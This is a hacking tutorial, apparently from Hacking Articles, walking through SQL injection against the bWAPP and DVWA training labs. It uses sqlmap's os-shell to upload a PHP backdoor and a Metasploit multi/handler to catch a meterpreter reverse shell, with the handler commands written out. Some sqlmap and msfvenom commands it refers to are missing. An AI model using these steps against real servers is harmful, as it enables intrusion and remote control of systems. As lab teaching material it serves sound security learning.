@@ -1,0 +1,86 @@
+
+Shell uploading in Web Server using Sqlmap
+
+Multiple times you people have used sqlmap for sql injection to get database of web server. Here in this tutorial I will show you how to upload any backdoor if the website is suffering from sql vulnerability.
+Requirement:
+Xampp/Wamp Server
+bWAPP Lab
+Kali Linux: Burp suite, sqlmap tool
+Firstly you need to install bWAPP lab in your XAMPP or WAMP server, read full article from here
+Let’s begin!!!
+Start service Apache and Mysql in Xampp or Wamp server. Let’s open the local host address in browser as I am using 192.168.1.101:81/bWAPP/login.php. Enter user and password as bee and bug respectively.
+Set security level low, from list box chooses your bug select SQL-Injection (GET/SEARCH) now and click on hack.
+
+Type any movie name like thor in the text field and just after that start the burp suite in kali Linux.
+
+To capture the cookie of bWAPP click on proxy tag then click to inception is on button, come back to bWAPP and now click on search. Burp suit will provide cookie and referrer under fetched data which will later use in sqlmap commands.
+
+Now Type following command to run sqlmap to access os-shell of web server.
+
+Above command will try to generate a backdoor; I want to send PHP backdoor in target pc therefore type 4 for PHP payload and then Type 1 for common location to use as writable directory to upload it.
+
+At present it is trying to upload the file on “C: /xampp/htdocs/” by using different sql injection techniques. As soon as file is uploaded; it will send INFO the file stager has been successfully uploaded on “C: /xampp/htdocs/”and you will get os-shell of victim pc. But here it also showing the path where you can manually upload your backdoor, look at over highlighted URL:
+http://192.168.0.102:80/tmpuuddt.php
+
+I am more interested in meterpreter shell so let’s prepare the malicious file that you would upload with msfvenom :
+Copy the code from <?php to die() and save it in a file with .php extension. I have saved the backdoor as shell.php on desktop and will later browser this file to upload on web server.
+Now load metasploit framework by typing msfconsole and start multi/handler
+
+Explore the URL: http://192.168.0.102/tmpuuddt.php on browser. From screenshot you can read the heading of web page sqlmap file uploader which will let you to browse you backdoor on web server and will later upload that backdoor to following directory (“C: /xampp/htdocs/” )of web server.
+
+Click on browse to select your shell.php file and then click on upload.
+
+GREAT!!!  Our backdoor shell.php File uploaded.
+
+To execute backdoor on target pc run URL:192.168.0.102/shell.php on browser and you will receive reverse connection to multi/handler.
+
+ msf> use multi/handler
+msf exploit(handler) > set lport 4444
+msf exploit(handler) > set lhost 192.168.0.104
+msf exploit(handler) > set payload php/meterpreter/reverse_tcp
+msf exploit(handler) > exploit
+meterpreter>sysinfo
+Lovely!!! I have my meterpreter session on my kali Linux.
+
+Very first you need to install DVWA lab in your XAMPP or WAMP server, read full article from here
+Now open the DVWA in your pc and login with following credentials:
+Username – admin
+Password – password
+Click on DVWA Security and set Website Security Level low
+From the list of vulnerability select SQL Injection for your attack. Type user ID: 1 in text box.  Don’t click on submit button without setting browser proxy. Set your browser proxy to make burp suite work properly.  
+
+Turn on burp suite click on proxy in menu bar and go for intercept is on button. Come back and click on submit button in dvwa. The Intercept button is used to display HTTP and Web Sockets messages that pass between your browser and web servers. Burp suit will provide” cookie” and “referrer” under fetched data which will later use in sqlmap commands.
+
+In following Sqlmap will analysis the url for making connection from target and then use sql queries for given cookies to fetch all names of database.
+
+So if you notice image given below it has dumb all name of database. Choose dvwa to upload php backdoor.
+
+Now Type following command to run sqlmap to access os-shell of web server (dvwa)
+
+It will try to generate a backdoor; I want to create PHP backdoor in target pc therefore type 4 for PHP payload and then Type 4 for brute force search to use as writable directory to upload it.
+
+It is trying to upload the file on “/xampp/htdocs/” by using different sql injection techniques. As soon as file is uploaded; it will send INFO the file stager has been successfully uploaded on “/xampp/htdocs/”and you will get os-shell of victim pc. Other than here it also shows the path where
+you can manually upload your backdoor, look at over highlighted URL:
+http://192.168.0.102:80/tmpunias.php
+
+Explore the URL:http://192.168.0.102/tmpunais.php on browser. From screenshot you can read the heading of web page sqlmap file uploader which will let you to browse you backdoor on web server(dvwa) and will later upload that backdoor to following directory (“/xampp/htdocs/” )of web server.
+
+Let’s prepare the malicious file that you would upload with msfvenom :
+copy the code from <?php to die() and save it in a file with .php extension. I have saved the backdoor as shell.php on desktop and will later browser this file to upload on web server.
+Now load metasploit framework by typing msfconsole and start multi/handler
+
+Click on browse to select your shell.php file and then click on upload.
+
+GREAT!!!  Here it shows Admin File is uploaded which means backdoor shell.php is uploaded.
+
+To execute backdoor on target pc run URL:192.168.0.102/shell.php on browser and you will receive reverse connection to multi/handler.
+
+msf> use multi/handler
+msf exploit(handler) > set lport 4444
+msf exploit(handler) > set lhost 192.168.0.104
+msf exploit(handler) > set payload php/meterpreter/reverse_tcp
+msf exploit(handler) > exploit
+meterpreter>sysinfo
+Divine!!!  meterpreter session is opened .
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
